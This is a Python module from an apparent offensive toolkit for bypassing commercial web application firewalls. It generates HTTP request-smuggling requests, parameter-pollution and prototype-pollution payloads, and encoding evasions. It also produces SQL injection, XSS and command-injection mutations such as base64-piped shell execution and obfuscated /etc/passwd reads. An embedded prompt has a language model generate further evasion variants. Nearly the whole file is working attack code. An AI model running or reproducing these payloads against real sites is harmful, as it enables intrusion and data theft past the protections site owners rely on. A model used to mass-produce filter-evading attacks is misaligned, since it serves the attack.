"""
WAF & Cloud WAF Bypass Engine
==============================
Advanced WAF bypass techniques for Cloudflare, Akamai, Imperva, AWS WAF and more.

Features:
- HTTP/2 Request Smuggling (H2.CL, H2.TE, H2.0)
- Parameter Pollution (HPP, JSON pollution)
- Unicode Normalization Attacks
- Chunked Encoding Mutation
- AI-Powered Payload Mutation
- WAF Fingerprinting & Profiling
- Rate Limit Bypass
- Bot Detection Evasion

Author: Monolith Security Team
Version: 1.0.0
"""

import os
import re
import sys
import json
import time
import random
import string
import base64
import hashlib
import urllib.parse
from enum import Enum
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass, field
from datetime import datetime
import struct

# Try to import optional dependencies
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# Try to import AI engine
try:
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from cybermodules.llm_engine import LLMEngine
    HAS_LLM = True
except ImportError:
    HAS_LLM = False


# ============================================================================
# Enums and Constants
# ============================================================================

class WAFVendor(Enum):
    """Known WAF vendors."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    AWS_WAF = "aws_waf"
    AZURE_WAF = "azure_waf"
    GCP_ARMOR = "gcp_armor"
    F5_BIG_IP = "f5_bigip"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    SUCURI = "sucuri"
    MODSECURITY = "modsecurity"
    NGINX_WAF = "nginx_waf"
    UNKNOWN = "unknown"


class BypassTechnique(Enum):
    """WAF bypass techniques."""
    # HTTP Smuggling
    HTTP2_CL_SMUGGLING = "http2_cl_smuggling"
    HTTP2_TE_SMUGGLING = "http2_te_smuggling"
    HTTP2_H2C_SMUGGLING = "http2_h2c_smuggling"
    CL_TE_DESYNC = "cl_te_desync"
    TE_CL_DESYNC = "te_cl_desync"
    TE_TE_DESYNC = "te_te_desync"
    
    # Parameter Manipulation
    HPP_DUPLICATE = "hpp_duplicate"
    HPP_ARRAY = "hpp_array"
    JSON_POLLUTION = "json_pollution"
    XML_POLLUTION = "xml_pollution"
    
    # Encoding Attacks
    UNICODE_NORMALIZATION = "unicode_normalization"
    DOUBLE_URL_ENCODE = "double_url_encode"
    MIXED_ENCODING = "mixed_encoding"
    OVERLONG_UTF8 = "overlong_utf8"
    UTF7_ENCODING = "utf7_encoding"
    UTF16_ENCODING = "utf16_encoding"
    HTML_ENTITY = "html_entity"
    
    # Chunked Encoding
    CHUNKED_MUTATION = "chunked_mutation"
    CHUNKED_EXTENSION = "chunked_extension"
    CHUNKED_COMMENT = "chunked_comment"
    
    # Header Manipulation
    HEADER_INJECTION = "header_injection"
    HOST_OVERRIDE = "host_override"
    X_FORWARDED_BYPASS = "x_forwarded_bypass"
    CONTENT_TYPE_BYPASS = "content_type_bypass"
    
    # Payload Mutation
    CASE_SWITCHING = "case_switching"
    NULL_BYTE_INJECTION = "null_byte_injection"
    COMMENT_INJECTION = "comment_injection"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    CONCATENATION_BYPASS = "concatenation_bypass"
    
    # AI Enhanced
    AI_MUTATION = "ai_mutation"
    ML_EVASION = "ml_evasion"


class AttackType(Enum):
    """Attack payload types."""
    SQLI = "sqli"
    XSS = "xss"
    RCE = "rce"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class WAFProfile:
    """WAF vendor profile with bypass strategies."""
    vendor: WAFVendor
    name: str
    detection_patterns: List[str] = field(default_factory=list)
    effective_techniques: List[BypassTechnique] = field(default_factory=list)
    blocked_patterns: List[str] = field(default_factory=list)
    rate_limit: Optional[int] = None
    bot_detection: bool = False
    javascript_challenge: bool = False
    captcha: bool = False
    ml_detection: bool = False


@dataclass
class BypassPayload:
    """Generated bypass payload."""
    original: str
    mutated: str
    technique: BypassTechnique
    attack_type: AttackType
    encoding: str
    headers: Dict[str, str] = field(default_factory=dict)
    success_probability: float = 0.0
    waf_target: Optional[WAFVendor] = None


@dataclass
class WAFFingerprint:
    """WAF fingerprinting result."""
    vendor: WAFVendor
    confidence: float
    evidence: List[str] = field(default_factory=list)
    version: Optional[str] = None
    features: Dict[str, bool] = field(default_factory=dict)


@dataclass
class SmugglingRequest:
    """HTTP smuggling request structure."""
    method: str = "POST"
    path: str = "/"
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    smuggled_request: Optional[str] = None
    technique: BypassTechnique = BypassTechnique.CL_TE_DESYNC


# ============================================================================
# WAF Fingerprinting Engine
# ============================================================================

class WAFFingerprinter:
    """Fingerprint and identify WAF vendors."""
    
    # WAF signature patterns
    SIGNATURES = {
        WAFVendor.CLOUDFLARE: {
            "headers": ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id"],
            "cookies": ["__cfduid", "__cf_bm"],
            "body_patterns": ["cloudflare", "ray id", "cf-ray"],
            "status_codes": [403, 503],
            "error_pages": ["attention required", "cloudflare ray id", "please turn javascript on"]
        },
        WAFVendor.AKAMAI: {
            "headers": ["x-akamai-transformed", "akamai-origin-hop", "x-akamai-request-id"],
            "cookies": ["ak_bmsc", "bm_sv", "bm_sz"],
            "body_patterns": ["akamai", "access denied", "reference"],
            "status_codes": [403],
            "error_pages": ["reference #", "access denied"]
        },
        WAFVendor.IMPERVA: {
            "headers": ["x-iinfo", "x-cdn"],
            "cookies": ["incap_ses", "visid_incap", "nlbi_"],
            "body_patterns": ["imperva", "incapsula", "incident id"],
            "status_codes": [403],
            "error_pages": ["incident id", "incapsula"]
        },
        WAFVendor.AWS_WAF: {
            "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-cf-pop"],
            "cookies": [],
            "body_patterns": ["aws", "request blocked"],
            "status_codes": [403],
            "error_pages": ["request blocked", "aws waf"]
        },
        WAFVendor.MODSECURITY: {
            "headers": ["server"],
            "cookies": [],
            "body_patterns": ["mod_security", "modsecurity", "not acceptable"],
            "status_codes": [403, 406],
            "error_pages": ["mod_security", "not acceptable"]
        },
        WAFVendor.F5_BIG_IP: {
            "headers": ["x-wa-info", "x-cnection"],
            "cookies": ["ts", "bigipserver"],
            "body_patterns": ["request rejected", "f5 networks"],
            "status_codes": [403],
            "error_pages": ["request rejected", "the requested url was rejected"]
        },
        WAFVendor.SUCURI: {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "cookies": ["sucuri_cloudproxy"],
            "body_patterns": ["sucuri", "cloudproxy", "access denied"],
            "status_codes": [403],
            "error_pages": ["sucuri website firewall", "access denied"]
        }
    }
    
    def __init__(self):
        self.fingerprints: Dict[str, WAFFingerprint] = {}
    
    def fingerprint(self, response_headers: Dict[str, str], 
                   response_body: str, 
                   status_code: int,
                   url: str = "") -> WAFFingerprint:
        """
        Fingerprint WAF from HTTP response.
        
        Args:
            response_headers: Response headers (lowercase keys)
            response_body: Response body content
            status_code: HTTP status code
            url: Target URL (optional)
            
        Returns:
            WAFFingerprint with detected vendor and confidence
        """
        scores: Dict[WAFVendor, float] = {v: 0.0 for v in WAFVendor}
        evidence: Dict[WAFVendor, List[str]] = {v: [] for v in WAFVendor}
        
        # Normalize headers to lowercase
        headers_lower = {k.lower(): v for k, v in response_headers.items()}
        body_lower = response_body.lower()
        
        for vendor, sigs in self.SIGNATURES.items():
            # Check headers
            for header in sigs["headers"]:
                if header.lower() in headers_lower:
                    scores[vendor] += 30
                    evidence[vendor].append(f"Header: {header}")
            
            # Check cookies
            cookie_header = headers_lower.get("set-cookie", "") + headers_lower.get("cookie", "")
            for cookie in sigs["cookies"]:
                if cookie.lower() in cookie_header.lower():
                    scores[vendor] += 25
                    evidence[vendor].append(f"Cookie: {cookie}")
            
            # Check body patterns
            for pattern in sigs["body_patterns"]:
                if pattern.lower() in body_lower:
                    scores[vendor] += 20
                    evidence[vendor].append(f"Body: {pattern}")
            
            # Check status code
            if status_code in sigs["status_codes"]:
                scores[vendor] += 10
                evidence[vendor].append(f"Status: {status_code}")
            
            # Check error page patterns
            for error_pattern in sigs["error_pages"]:
                if error_pattern.lower() in body_lower:
                    scores[vendor] += 15
                    evidence[vendor].append(f"Error page: {error_pattern}")
        
        # Find best match
        best_vendor = max(scores.keys(), key=lambda v: scores[v])
        best_score = scores[best_vendor]
        
        # Calculate confidence (0-1)
        confidence = min(best_score / 100.0, 1.0) if best_score > 0 else 0.0
        
        if confidence < 0.3:
            best_vendor = WAFVendor.UNKNOWN
        
        fingerprint = WAFFingerprint(
            vendor=best_vendor,
            confidence=confidence,
            evidence=evidence[best_vendor] if best_vendor != WAFVendor.UNKNOWN else [],
            features={
                "bot_detection": self._detect_bot_protection(body_lower),
                "js_challenge": self._detect_js_challenge(body_lower),
                "captcha": self._detect_captcha(body_lower),
                "ml_detection": self._detect_ml(headers_lower, body_lower)
            }
        )
        
        # Cache fingerprint
        if url:
            self.fingerprints[url] = fingerprint
        
        return fingerprint
    
    def _detect_bot_protection(self, body: str) -> bool:
        """Detect bot protection features."""
        patterns = ["bot", "automation", "selenium", "webdriver", "headless"]
        return any(p in body for p in patterns)
    
    def _detect_js_challenge(self, body: str) -> bool:
        """Detect JavaScript challenge."""
        patterns = ["javascript", "checking your browser", "please wait", "enable javascript"]
        return any(p in body for p in patterns)
    
    def _detect_captcha(self, body: str) -> bool:
        """Detect CAPTCHA requirement."""
        patterns = ["captcha", "recaptcha", "hcaptcha", "verify you are human"]
        return any(p in body for p in patterns)
    
    def _detect_ml(self, headers: Dict, body: str) -> bool:
        """Detect ML-based detection."""
        # ML detection indicators
        ml_headers = ["x-ml-score", "x-anomaly-score", "x-risk-score"]
        return any(h in headers for h in ml_headers)


# ============================================================================
# Encoding Engines
# ============================================================================

class EncodingEngine:
    """Advanced encoding techniques for WAF bypass."""
    
    # Unicode normalization mappings
    UNICODE_MAPPINGS = {
        '<': ['\uff1c', '\u003c', '\uff64', '\u2039', '\u276e'],
        '>': ['\uff1e', '\u003e', '\u203a', '\u276f'],
        '"': ['\uff02', '\u0022', '\u201c', '\u201d', '\u2033'],
        "'": ['\uff07', '\u0027', '\u2018', '\u2019', '\u02bc'],
        '(': ['\uff08', '\u0028', '\u208d', '\u2768'],
        ')': ['\uff09', '\u0029', '\u208e', '\u2769'],
        '/': ['\uff0f', '\u002f', '\u2044', '\u2215'],
        '\\': ['\uff3c', '\u005c', '\u2216'],
        ' ': ['\u0020', '\u00a0', '\u2000', '\u2001', '\u2002', '\u2003', '\u2004', '\u2005', '\u2006', '\u2007', '\u2008', '\u2009', '\u200a', '\u202f', '\u205f'],
        '=': ['\uff1d', '\u003d', '\u2261', '\u225d'],
        '&': ['\uff06', '\u0026'],
        '|': ['\uff5c', '\u007c', '\u2016', '\u2223'],
        ';': ['\uff1b', '\u003b', '\u037e'],
        '{': ['\uff5b', '\u007b', '\u2774'],
        '}': ['\uff5d', '\u007d', '\u2775'],
        '[': ['\uff3b', '\u005b', '\u2772'],
        ']': ['\uff3d', '\u005d', '\u2773'],
    }
    
    # HTML entity mappings
    HTML_ENTITIES = {
        '<': ['&lt;', '&#60;', '&#x3c;', '&#x3C;', '&#060;', '&LT;'],
        '>': ['&gt;', '&#62;', '&#x3e;', '&#x3E;', '&#062;', '&GT;'],
        '"': ['&quot;', '&#34;', '&#x22;', '&QUOT;'],
        "'": ['&#39;', '&#x27;', '&apos;'],
        '&': ['&amp;', '&#38;', '&#x26;'],
        ' ': ['&nbsp;', '&#32;', '&#x20;'],
        '/': ['&#47;', '&#x2f;', '&#x2F;'],
    }
    
    def __init__(self):
        pass
    
    def unicode_normalize(self, payload: str, aggressive: bool = False) -> str:
        """
        Apply Unicode normalization attacks.
        
        Args:
            payload: Original payload
            aggressive: Use all possible replacements
            
        Returns:
            Unicode-mutated payload
        """
        result = payload
        
        for char, replacements in self.UNICODE_MAPPINGS.items():
            if char in result:
                if aggressive:
                    # Replace all occurrences randomly
                    for _ in range(result.count(char)):
                        replacement = random.choice(replacements)
                        result = result.replace(char, replacement, 1)
                else:
                    # Replace first occurrence only
                    replacement = random.choice(replacements)
                    result = result.replace(char, replacement, 1)
        
        return result
    
    def double_url_encode(self, payload: str) -> str:
        """Double URL encode payload."""
        # First encode
        first = urllib.parse.quote(payload, safe='')
        # Second encode the % signs
        second = first.replace('%', '%25')
        return second
    
    def triple_url_encode(self, payload: str) -> str:
        """Triple URL encode payload."""
        return self.double_url_encode(urllib.parse.quote(payload, safe=''))
    
    def mixed_encoding(self, payload: str) -> str:
        """Apply mixed encoding (URL + Unicode + HTML)."""
        result = ""
        for char in payload:
            choice = random.randint(0, 2)
            if choice == 0 and char in self.UNICODE_MAPPINGS:
                result += random.choice(self.UNICODE_MAPPINGS[char])
            elif choice == 1 and char in self.HTML_ENTITIES:
                result += random.choice(self.HTML_ENTITIES[char])
            elif choice == 2 and not char.isalnum():
                result += urllib.parse.quote(char)
            else:
                result += char
        return result
    
    def overlong_utf8(self, payload: str) -> bytes:
        """
        Generate overlong UTF-8 encoding.
        This exploits parsers that don't properly validate UTF-8.
        """
        result = b""
        for char in payload:
            code = ord(char)
            if code < 0x80:
                # Use 2-byte overlong encoding
                result += bytes([0xC0 | (code >> 6), 0x80 | (code & 0x3F)])
            else:
                result += char.encode('utf-8')
        return result
    
    def utf7_encode(self, payload: str) -> str:
        """Encode payload in UTF-7."""
        try:
            return payload.encode('utf-7').decode('ascii')
        except:
            return payload
    
    def utf16_encode(self, payload: str) -> str:
        """Encode payload with UTF-16 representation."""
        result = ""
        for char in payload:
            if not char.isalnum():
                code = ord(char)
                result += f"\\u{code:04x}"
            else:
                result += char
        return result
    
    def html_entity_encode(self, payload: str, random_case: bool = True) -> str:
        """Encode using HTML entities."""
        result = ""
        for char in payload:
            if char in self.HTML_ENTITIES:
                entity = random.choice(self.HTML_ENTITIES[char])
                if random_case:
                    entity = ''.join(
                        c.upper() if random.random() > 0.5 else c.lower() 
                        for c in entity
                    )
                result += entity
            else:
                result += char
        return result
    
    def hex_encode(self, payload: str, prefix: str = "0x") -> str:
        """Encode payload as hex."""
        return prefix + payload.encode().hex()
    
    def octal_encode(self, payload: str) -> str:
        """Encode payload as octal."""
        return ''.join(f'\\{ord(c):03o}' for c in payload)
    
    def base64_chunks(self, payload: str, chunk_size: int = 4) -> str:
        """Encode as base64 with chunked decoding."""
        encoded = base64.b64encode(payload.encode()).decode()
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        return '+'.join(chunks)


# ============================================================================
# HTTP Smuggling Engine
# ============================================================================

class HTTPSmugglingEngine:
    """HTTP Request Smuggling attacks for WAF bypass."""
    
    def __init__(self):
        self.encoding_engine = EncodingEngine()
    
    def generate_cl_te_smuggle(self, smuggled_request: str,
                               host: str = "target.com",
                               path: str = "/") -> SmugglingRequest:
        """
        Generate CL.TE request smuggling attack.
        Front-end uses Content-Length, back-end uses Transfer-Encoding.
        """
        # Calculate smuggled request length
        smuggled = f"GET {smuggled_request} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        
        # Create body with chunked encoding
        # The 0\r\n\r\n terminates chunked but CL includes more data
        body = f"0\r\n\r\n{smuggled}"
        
        # Content-Length covers only partial body
        cl_value = len("0\r\n\r\n")
        
        request = SmugglingRequest(
            method="POST",
            path=path,
            headers={
                "Host": host,
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(cl_value),
                "Transfer-Encoding": "chunked"
            },
            body=body,
            smuggled_request=smuggled,
            technique=BypassTechnique.CL_TE_DESYNC
        )
        
        return request
    
    def generate_te_cl_smuggle(self, smuggled_request: str,
                               host: str = "target.com",
                               path: str = "/") -> SmugglingRequest:
        """
        Generate TE.CL request smuggling attack.
        Front-end uses Transfer-Encoding, back-end uses Content-Length.
        """
        smuggled = f"GET {smuggled_request} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        
        # Create chunked body
        chunk_data = f"malicious\r\n{smuggled}"
        chunk_size = hex(len(chunk_data))[2:]
        
        body = f"{chunk_size}\r\n{chunk_data}0\r\n\r\n"
        
        # Content-Length only covers first chunk indicator
        cl_value = len(chunk_size) + 2 + len("malicious")
        
        request = SmugglingRequest(
            method="POST",
            path=path,
            headers={
                "Host": host,
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(cl_value),
                "Transfer-Encoding": "chunked"
            },
            body=body,
            smuggled_request=smuggled,
            technique=BypassTechnique.TE_CL_DESYNC
        )
        
        return request
    
    def generate_te_te_smuggle(self, smuggled_request: str,
                               host: str = "target.com",
                               path: str = "/",
                               obfuscation: str = "chunked") -> SmugglingRequest:
        """
        Generate TE.TE request smuggling attack.
        Obfuscate Transfer-Encoding to confuse one server.
        """
        smuggled = f"GET {smuggled_request} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        
        # Obfuscated Transfer-Encoding values
        te_obfuscations = [
            "chunked",
            " chunked",
            "chunked ",
            "\tchunked",
            "chunked\t",
            " chunked ",
            "CHUNKED",
            "Chunked",
            "chunked\r\nX-Ignore: x",
            "x]chunked",
            "chunked, cow",
            "cow, chunked",
            "xchunked",
            "chunkedx",
        ]
        
        chunk_data = smuggled
        chunk_size = hex(len(chunk_data))[2:]
        body = f"{chunk_size}\r\n{chunk_data}0\r\n\r\n"
        
        te_value = obfuscation if obfuscation != "chunked" else random.choice(te_obfuscations)
        
        request = SmugglingRequest(
            method="POST",
            path=path,
            headers={
                "Host": host,
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": te_value
            },
            body=body,
            smuggled_request=smuggled,
            technique=BypassTechnique.TE_TE_DESYNC
        )
        
        return request
    
    def generate_h2c_smuggle(self, smuggled_request: str,
                             host: str = "target.com") -> SmugglingRequest:
        """
        Generate HTTP/2 to HTTP/1.1 downgrade smuggling.
        """
        # H2C upgrade request
        smuggled = f"GET {smuggled_request} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        
        request = SmugglingRequest(
            method="GET",
            path="/",
            headers={
                "Host": host,
                "Upgrade": "h2c",
                "HTTP2-Settings": base64.b64encode(b"\x00\x00\x00\x04\x00\x00\x00\x00").decode(),
                "Connection": "Upgrade, HTTP2-Settings"
            },
            body="",
            smuggled_request=smuggled,
            technique=BypassTechnique.HTTP2_H2C_SMUGGLING
        )
        
        return request
    
    def generate_http2_smuggle(self, method: str = "GET",
                               path: str = "/admin",
                               host: str = "target.com") -> Dict[str, Any]:
        """
        Generate HTTP/2 request smuggling payload.
        Exploits pseudo-header injection.
        """
        # HTTP/2 pseudo-headers with injection
        smuggle_payloads = {
            "pseudo_header_injection": {
                ":method": method,
                ":path": path,
                ":authority": host,
                ":scheme": "https",
                # Inject via header line injection
                "foo": f"bar\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
            },
            "header_name_injection": {
                ":method": method,
                ":path": f"{path}\r\nX-Injected: true",
                ":authority": host,
                ":scheme": "https"
            },
            "authority_confusion": {
                ":method": method,
                ":path": path,
                ":authority": f"{host}\r\nHost: internal.target.com",
                ":scheme": "https"
            }
        }
        
        return smuggle_payloads
    
    def generate_chunked_mutation(self, payload: str) -> List[str]:
        """
        Generate chunked encoding mutations for WAF bypass.
        """
        mutations = []
        
        # Normal chunked
        size = hex(len(payload))[2:]
        mutations.append(f"{size}\r\n{payload}\r\n0\r\n\r\n")
        
        # Uppercase hex
        mutations.append(f"{size.upper()}\r\n{payload}\r\n0\r\n\r\n")
        
        # With chunk extension (should be ignored)
        mutations.append(f"{size};ext=value\r\n{payload}\r\n0\r\n\r\n")
        
        # With spaces around size
        mutations.append(f" {size} \r\n{payload}\r\n0\r\n\r\n")
        
        # Multiple chunks
        if len(payload) > 2:
            mid = len(payload) // 2
            s1, s2 = hex(mid)[2:], hex(len(payload) - mid)[2:]
            mutations.append(f"{s1}\r\n{payload[:mid]}\r\n{s2}\r\n{payload[mid:]}\r\n0\r\n\r\n")
        
        # With leading zeros
        mutations.append(f"0{size}\r\n{payload}\r\n0\r\n\r\n")
        
        # With comment-like extension
        mutations.append(f"{size};comment=WAF-bypass\r\n{payload}\r\n0\r\n\r\n")
        
        return mutations


# ============================================================================
# Parameter Pollution Engine
# ============================================================================

class ParameterPollutionEngine:
    """HTTP Parameter Pollution for WAF bypass."""
    
    def __init__(self):
        pass
    
    def hpp_duplicate(self, param: str, value: str, 
                      malicious_value: str) -> List[str]:
        """
        Generate HPP (HTTP Parameter Pollution) payloads.
        Different servers handle duplicate parameters differently.
        """
        payloads = [
            # Duplicate parameter - last wins (PHP, Apache)
            f"{param}={value}&{param}={malicious_value}",
            
            # Duplicate parameter - first wins (ASP.NET, IIS)
            f"{param}={malicious_value}&{param}={value}",
            
            # Array notation (PHP)
            f"{param}[]={value}&{param}[]={malicious_value}",
            
            # Mixed with encoding
            f"{param}={value}&{urllib.parse.quote(param)}={malicious_value}",
            
            # Different case
            f"{param}={value}&{param.upper()}={malicious_value}",
            f"{param}={value}&{param.lower()}={malicious_value}",
            
            # With semicolon (some parsers)
            f"{param}={value};{param}={malicious_value}",
            
            # Concatenation (ASP)
            f"{param}={value}&{param}={malicious_value}",  # Results in "value,malicious_value"
        ]
        
        return payloads
    
    def json_pollution(self, param: str, value: Any,
                       malicious_value: Any) -> List[Dict]:
        """
        Generate JSON parameter pollution payloads.
        Exploits duplicate key handling in JSON parsers.
        """
        payloads = []
        
        # Duplicate key - last wins (most parsers)
        payloads.append({param: value, param: malicious_value})
        
        # Unicode key variation
        unicode_param = ''.join(
            f"\\u{ord(c):04x}" if not c.isalnum() else c 
            for c in param
        )
        payloads.append({param: value, unicode_param: malicious_value})
        
        # Nested pollution
        payloads.append({param: {"value": value, "value": malicious_value}})
        
        # Array with objects
        payloads.append({param: [value, malicious_value]})
        
        # Prototype pollution attempt
        payloads.append({"__proto__": {param: malicious_value}})
        payloads.append({"constructor": {"prototype": {param: malicious_value}}})
        
        return payloads
    
    def xml_pollution(self, param: str, value: str,
                      malicious_value: str) -> List[str]:
        """
        Generate XML parameter pollution payloads.
        """
        payloads = []
        
        # Duplicate element
        payloads.append(f"<{param}>{value}</{param}><{param}>{malicious_value}</{param}>")
        
        # Attribute pollution
        payloads.append(f'<data {param}="{value}" {param}="{malicious_value}"/>')
        
        # Namespace pollution
        payloads.append(f'<ns:{param}>{value}</ns:{param}><{param}>{malicious_value}</{param}>')
        
        # CDATA injection
        payloads.append(f"<{param}>{value}<![CDATA[{malicious_value}]]></{param}>")
        
        # Comment injection
        payloads.append(f"<{param}>{value}<!--{malicious_value}--></{param}>")
        
        return payloads


# ============================================================================
# AI Payload Mutator
# ============================================================================

class AIPayloadMutator:
    """AI-powered payload mutation for WAF bypass."""
    
    def __init__(self):
        self.llm_engine = LLMEngine(scan_id="waf_bypass") if HAS_LLM else None
        self.mutation_history: List[Dict] = []
        self.successful_mutations: List[Dict] = []
    
    def mutate_payload(self, payload: str, attack_type: AttackType,
                       waf_vendor: WAFVendor = WAFVendor.UNKNOWN,
                       blocked_patterns: List[str] = None) -> List[str]:
        """
        Use AI to mutate payload for WAF bypass.
        
        Args:
            payload: Original attack payload
            attack_type: Type of attack (SQLi, XSS, etc.)
            waf_vendor: Target WAF vendor
            blocked_patterns: Known blocked patterns
            
        Returns:
            List of mutated payloads
        """
        mutations = []
        
        if self.llm_engine:
            try:
                prompt = self._build_mutation_prompt(
                    payload, attack_type, waf_vendor, blocked_patterns
                )
                
                response = self.llm_engine.query(prompt)
                
                # Parse AI response for mutations
                mutations = self._parse_ai_mutations(response)
                
            except Exception as e:
                print(f"[WAF Bypass] AI mutation error: {e}")
        
        # Add rule-based mutations as fallback
        mutations.extend(self._rule_based_mutations(payload, attack_type))
        
        # Record history
        self.mutation_history.append({
            "original": payload,
            "mutations": mutations,
            "waf": waf_vendor.value,
            "timestamp": datetime.now().isoformat()
        })
        
        return list(set(mutations))  # Remove duplicates
    
    def _build_mutation_prompt(self, payload: str, attack_type: AttackType,
                               waf_vendor: WAFVendor,
                               blocked_patterns: List[str] = None) -> str:
        """Build prompt for AI payload mutation."""
        prompt = f"""You are a WAF bypass expert. Generate evasion variants of this payload.

Target WAF: {waf_vendor.value}
Attack Type: {attack_type.value}
Original Payload: {payload}

"""
        if blocked_patterns:
            prompt += f"Known blocked patterns: {', '.join(blocked_patterns)}\n\n"
        
        prompt += """Generate 5 bypass variants using these techniques:
1. Unicode normalization (use fullwidth chars, homoglyphs)
2. Case manipulation and string concatenation
3. Comment injection (SQL: /**/, --, HTML: <!---->)
4. Encoding tricks (double URL encode, hex, octal)
5. Whitespace manipulation (tabs, newlines, null bytes)

Output ONLY the mutated payloads, one per line, no explanations."""
        
        return prompt
    
    def _parse_ai_mutations(self, response: str) -> List[str]:
        """Parse AI response to extract mutations."""
        mutations = []
        
        lines = response.strip().split('\n')
        for line in lines:
            line = line.strip()
            # Skip empty lines and numbering
            if not line or line.startswith('#'):
                continue
            # Remove numbering like "1.", "1)", etc.
            line = re.sub(r'^\d+[\.\)]\s*', '', line)
            if line:
                mutations.append(line)
        
        return mutations
    
    def _rule_based_mutations(self, payload: str, 
                              attack_type: AttackType) -> List[str]:
        """Generate rule-based mutations."""
        mutations = []
        encoding = EncodingEngine()
        
        # Common mutations for all types
        mutations.append(encoding.unicode_normalize(payload))
        mutations.append(encoding.double_url_encode(payload))
        mutations.append(encoding.mixed_encoding(payload))
        
        # Attack-specific mutations
        if attack_type == AttackType.SQLI:
            mutations.extend(self._sqli_mutations(payload))
        elif attack_type == AttackType.XSS:
            mutations.extend(self._xss_mutations(payload))
        elif attack_type == AttackType.RCE:
            mutations.extend(self._rce_mutations(payload))
        elif attack_type == AttackType.PATH_TRAVERSAL:
            mutations.extend(self._path_traversal_mutations(payload))
        
        return mutations
    
    def _sqli_mutations(self, payload: str) -> List[str]:
        """SQL injection specific mutations."""
        mutations = []
        
        # Comment variations
        comments = ['/**/', '/*!*/', '-- -', '#', '-- /*']
        for comment in comments:
            # Insert comments between keywords
            mutated = re.sub(r'(\s+)', f'{comment}\\1', payload)
            mutations.append(mutated)
        
        # Case switching
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE']
        mutated = payload
        for kw in keywords:
            # Random case
            random_case = ''.join(
                c.upper() if random.random() > 0.5 else c.lower() 
                for c in kw
            )
            mutated = re.sub(kw, random_case, mutated, flags=re.IGNORECASE)
        mutations.append(mutated)
        
        # Whitespace alternatives
        whitespace_alts = ['\t', '\n', '\r', '\x0b', '\x0c', '\xa0', '/**/']
        for ws in whitespace_alts:
            mutations.append(payload.replace(' ', ws))
        
        # String concatenation
        mutations.append(payload.replace("'", "'"+"'"))
        mutations.append(payload.replace('"', '"'+'"'))
        
        # Hex encoding strings
        if "'" in payload:
            # Convert strings to hex
            def hex_strings(m):
                s = m.group(1)
                return '0x' + s.encode().hex()
            mutations.append(re.sub(r"'([^']+)'", hex_strings, payload))
        
        return mutations
    
    def _xss_mutations(self, payload: str) -> List[str]:
        """XSS specific mutations."""
        mutations = []
        encoding = EncodingEngine()
        
        # HTML entity encoding
        mutations.append(encoding.html_entity_encode(payload))
        
        # Event handler variations
        event_handlers = ['onerror', 'onload', 'onfocus', 'onmouseover', 'onclick']
        for handler in event_handlers:
            if handler.lower() in payload.lower():
                # Case variations
                mutations.append(re.sub(handler, handler.upper(), payload, flags=re.IGNORECASE))
                # With null bytes
                null_handler = ''.join(f"{c}\x00" for c in handler)
                mutations.append(payload.replace(handler, null_handler))
        
        # Tag variations
        if '<script' in payload.lower():
            mutations.append(payload.replace('<script', '<ScRiPt'))
            mutations.append(payload.replace('<script', '<script/'))
            mutations.append(payload.replace('<script', '<script\t'))
            mutations.append(payload.replace('<script', '<script\n'))
        
        # SVG/IMG alternatives
        svg_payloads = [
            '<svg onload=alert(1)>',
            '<svg/onload=alert(1)>',
            '<img src=x onerror=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
        ]
        mutations.extend(svg_payloads)
        
        # JavaScript protocol variations
        if 'javascript:' in payload.lower():
            mutations.append(payload.replace('javascript:', 'javascript\t:'))
            mutations.append(payload.replace('javascript:', 'java\tscript:'))
            mutations.append(payload.replace('javascript:', 'JaVaScRiPt:'))
            mutations.append(payload.replace('javascript:', '&#106;avascript:'))
        
        return mutations
    
    def _rce_mutations(self, payload: str) -> List[str]:
        """RCE/Command injection specific mutations."""
        mutations = []
        
        # Command separators
        separators = [';', '|', '||', '&&', '\n', '\r\n', '`', '$()']
        for sep in separators:
            if ' ' in payload:
                mutations.append(payload.replace(' ', f'{sep} '))
        
        # Variable expansion
        if 'cat' in payload:
            mutations.append(payload.replace('cat', 'c$@at'))
            mutations.append(payload.replace('cat', 'c""at'))
            mutations.append(payload.replace('cat', "c''at"))
            mutations.append(payload.replace('cat', 'c\\at'))
        
        # Wildcard expansion
        mutations.append(payload.replace('/etc/passwd', '/et?/pas?wd'))
        mutations.append(payload.replace('/etc/passwd', '/e*/passwd'))
        
        # Command substitution
        if 'id' in payload:
            mutations.append(payload.replace('id', '$(id)'))
            mutations.append(payload.replace('id', '`id`'))
        
        # IFS manipulation
        mutations.append(f"IFS=,;{payload.replace(' ', ',')}")
        
        # Base64 encoding
        encoded = base64.b64encode(payload.encode()).decode()
        mutations.append(f"echo {encoded}|base64 -d|sh")
        mutations.append(f"bash -c \"$(echo {encoded}|base64 -d)\"")
        
        return mutations
    
